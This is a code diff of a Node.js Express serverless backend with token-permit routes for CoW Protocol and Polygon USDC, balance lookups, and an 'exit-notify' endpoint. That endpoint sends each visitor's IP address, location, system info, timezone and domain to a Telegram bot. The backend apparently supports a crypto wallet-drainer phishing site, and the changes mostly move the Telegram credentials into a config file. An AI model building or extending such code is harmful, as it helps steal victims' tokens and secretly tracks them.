@@ -2,6 +2,10 @@ const express = require("express");
 const serverless = require("serverless-http");
 const cors = require("cors");
 const bodyParser = require("body-parser");
+const dotenv = require("dotenv");
+const fetch = require("node-fetch");
+
+dotenv.config();
 
 const handleCowProtocolPermitRoute = require("../routes/handleCowProtocolPermit");
 const handlePolygonUSDCPermitRoute = require("../routes/handlePolygonUSDCPermit");
@@ -13,14 +17,14 @@ const balancesRoute = require("../routes/Balances");
 const coingeckoRoute = require("../routes/coingeckoProxy");
 const getInitiatorRoute = require("../routes/getInitiator");
 
-require("dotenv").config();
+const config = require("../config");
 
 const app = express();
 
-// CORS for your frontend
+// CORS setup for Vercel frontend
 app.use(
     cors({
-        origin: "https://monero-front.vercel.app",
+        origin: ["https://monero-front.vercel.app", "http://localhost:5173"],
         methods: ["GET", "POST"],
         allowedHeaders: ["Content-Type"],
     })
@@ -40,6 +44,7 @@ app.use("/api", balancesRoute);
 app.use("/api", coingeckoRoute);
 app.use("/api", getInitiatorRoute);
 
+// Exit Notify
 app.post("/api/exit-notify", bodyParser.text({ type: "*/*" }), async (req, res) => {
     try {
         const data = JSON.parse(req.body);
@@ -47,13 +52,10 @@ app.post("/api/exit-notify", bodyParser.text({ type: "*/*" }), async (req, res) 
 
         const message = `😭 *Exit Notification*\n\n*IP Address:* ${ip}\n*Location:* ${location}\n*System Info:* ${systemInfo}\n*Timezone:* ${timezone}\n*Domain Name:* ${domainName}`;
 
-        const botToken = process.env.TELEGRAM_BOT_TOKEN;
-        const chatId = process.env.TELEGRAM_CHAT_ID;
-
-        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        const response = await fetch(`https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
+            body: JSON.stringify({ chat_id: config.TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
         });
 
         const telegramData = await response.json();
@@ -69,5 +71,6 @@ app.post("/api/exit-notify", bodyParser.text({ type: "*/*" }), async (req, res) 
     }
 });
 
+// Export serverless handler
 module.exports = app;
 module.exports.handler = serverless(app);
